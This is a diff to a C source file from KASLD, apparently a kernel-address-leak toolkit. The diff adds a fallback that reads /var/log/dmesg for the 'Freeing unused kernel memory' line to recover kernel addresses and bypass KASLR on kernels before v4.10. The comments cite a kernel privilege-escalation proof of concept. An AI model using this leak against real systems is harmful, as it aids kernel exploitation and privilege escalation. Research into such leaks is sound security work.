@@ -1,6 +1,7 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
 //
-// free_reserved_area() dmesg KASLR bypass for SMP kernels.
+// free_reserved_area() printed virtual memory layout information to dmesg
+// for SMP kernels:
 //
 // x86:
 // [    0.985903] Freeing unused kernel memory: 872K (c19b4000 - c1a8e000)
@@ -11,17 +12,17 @@
 // ppc64:
 // [    2.950991] Freeing unused kernel memory: 960K (c000000000920000 - c000000000a10000)
 //
-// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
+// Removed in kernel v4.10-rc1 on 2016-10-26:
 // https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
 //
-// Mostly taken from original code by xairy:
-// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
-//
 // Requires:
-// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
+//   readable /var/log/dmesg.
 //
 // References:
 // https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
+// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
+// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
 // ---
 // <bcoles@gmail.com>
 
@@ -34,7 +35,7 @@
 #include <string.h>
 #include <unistd.h>
 
-unsigned long get_kernel_addr_dmesg_free_reserved_area() {
+unsigned long search_dmesg_free_reserved_area() {
   char *syslog;
   char *endptr;
   char *substr;
@@ -44,7 +45,7 @@ unsigned long get_kernel_addr_dmesg_free_reserved_area() {
   int size;
   unsigned long addr = 0;
 
-  printf("[.] searching for free_reserved_area() info ...\n");
+  printf("[.] searching dmesg for free_reserved_area() info ...\n");
 
   if (mmap_syslog(&syslog, &size))
     return 0;
@@ -72,8 +73,56 @@ unsigned long get_kernel_addr_dmesg_free_reserved_area() {
   return 0;
 }
 
+unsigned long search_dmesg_log_file_free_reserved_area() {
+  FILE *f;
+  char *endptr;
+  char *substr;
+  char *addr_buf;
+  char *line_buf;
+  const char *path = "/var/log/dmesg";
+  const char *needle = "Freeing unused kernel memory";
+  unsigned long addr = 0;
+  char buff[BUFSIZ];
+
+  printf("[.] searching %s for free_reserved_area() info ...\n", path);
+
+  f = fopen(path, "rb");
+  if (f == NULL) {
+    perror("[-] fopen");
+    return 0;
+  }
+
+  while ((fgets(buff, BUFSIZ, f)) != NULL) {
+    substr = strstr(buff, needle);
+    if (substr == NULL)
+      continue;
+
+    line_buf = strtok(substr, "\n");
+    if (line_buf == NULL)
+      break;
+
+    addr_buf = strstr(line_buf, "(");
+    if (addr_buf == NULL)
+      break;
+
+    addr = strtoul(&addr_buf[1], &endptr, 16);
+
+    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+      break;
+
+    addr = 0;
+  }
+
+  fclose(f);
+
+  return addr;
+}
+
 int main() {
-  unsigned long addr = get_kernel_addr_dmesg_free_reserved_area();
+  unsigned long addr = search_dmesg_free_reserved_area();
+  if (!addr)
+    addr = search_dmesg_log_file_free_reserved_area();
+
   if (!addr)
     return 1;
 
